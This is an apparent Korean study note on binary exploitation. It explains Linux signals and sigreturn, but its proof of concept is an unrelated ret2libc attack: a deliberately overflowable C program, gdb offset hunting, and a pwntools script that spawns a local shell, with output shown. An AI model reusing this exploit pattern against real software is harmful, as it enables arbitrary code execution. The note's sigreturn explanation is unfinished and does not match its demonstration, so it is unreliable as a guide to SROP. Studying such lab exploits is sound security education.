## Concept

sigreturn 시스템 콜을 이용하여 레지스터에 원하는 값을 저장한다.

### **Signal**

signal은 프로세스에게 이벤트가 발생했음을 알려준다.  

signal은 일반적으로 커널이 송신하며, 다음과 같은 이벤트 종류가 있다.  
    * 하드웨어 예외가 발생한 경우
    * 사용자가 시그널을 발생시키는 터미널 특수 문자 중 하나를 입력한 경우
    * 소프트웨어 이벤트 발생한 경우

signal이 프로세스에게 전달되면 시그널의 종류에 따라 다음과 같은 동작을 수행한다.
    * 시그널 무시
    * 프로세스 종료
    * 코어 덤프 파일 생성 후 프로세스 종료
    * 프로세스 중지
    * 프로세스 실행 재개

### **Signal Handler**

signal handler는 프로그램이 특정 시그널의 기본 동작을 수행하는 대신 프로그래머가 원하는 동작을 수행하도록 변경할 수 있다.  
signal hnadler는 User Mode 프로세스에 정의되어 있고 User Mode 코드 세그먼트에 포함된다.  
signal handler가 User Mode에서 실행되는 동안 Kernel Mode에서 handle_signal()함수가 실행된다.  
    * User Mode에서 Kernel Mode로 진입시 User Mode에서 사용중이던 context를 Kernel stack에 저장한다.  
    * Kernel Mode에서 User Mode로 진입 시 Kernel stack은 모두 초기화된다.  
    * 이러한 문제를 해결하기 위해 setup_frame(), sigreturn() 함수를 사용한다.  
        * setup_frame(): User Mode의 stack을 설정  
        * sigreturn(): Kernel Mode stack에 hardware context를 복사하고, User Mode stack의 원래의 context를 저장  

signal handler는 다음과 같이 처리된다.

## **Proof of Concept**  

```c
// Vuln Code
// gcc -fno-stack-protector -o ret2libc ret2libc.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50] = "";
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```
buf 크기는 50byte이지만 100byte를 입력받아 Buffer Overflow 발생.

```
gdb-peda$ x/24wx $ebp
0xbfdcb318:	0x41414141         0x42424242 <- &execve 0x43434343 <- &exit 0x44444444 <- &"/bin/sh"
0xbfdcb328:	0x45454545 <- null 0x46464646 <- null    0x0000000a          0xb7e0b637
```

execve()와 "/bin/sh" 주소를 확인한다.

```
gdb-peda$ p printf
$1 = {<text variable, no debug info>} 0xb7e3c670 <__printf>

gdb-peda$ p execve-printf
$2 = 0x67170

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f4ea0b ("/bin/sh")
gdb-peda$ p 0xb7f4ea0b-0xb7e3c670
$3 = 0x11239b

gdb-peda$ p printf-exit
$4 = 0x1aca0
```

## **Exploit Code**
```python
# Exploit Code
from pwn import *
p=process('ret2libc')

recv = p.recvline()
printf=int(recv.split(' ')[3],16)
execve = printf + int(0x67170)
binsh = printf + int(0x11239b)
exit = printf - int(0x1aca0)
null = printf - int(0x49530)

print('printf  :'+hex(printf))
print('execve  :'+hex(execve))
print('/bin/sh :'+hex(binsh))
print('exit    :'+hex(exit))
print('null    :'+hex(null))
p.sendline("A"*66+p32(execve)+p32(exit)+p32(binsh)+p32(null)+p32(null))

p.interactive()
```

## **Exploit**
```shell
bs@bs-virtual-machine:~$ python exploit.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[!] Could not find executable 'ret2libc' in $PATH, using './ret2libc' instead
[+] Starting local process './ret2libc': pid 16968
printf  :0xb7d94670
execve  :0xb7dfb7e0
/bin/sh :0xb7ea6a0b
exit    :0xb7d799d0
null    :0xb7d4b140
[*] Switching to interactive mode
$ id
uid=1000(bs) gid=1000(bs) groups=1000(bs),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

**Refereces**  
[https://www.lazenca.net/display/TEC/01.RTL%28Return+to+Libc%29+-+x86](https://www.lazenca.net/display/TEC/01.RTL%28Return+to+Libc%29+-+x86)

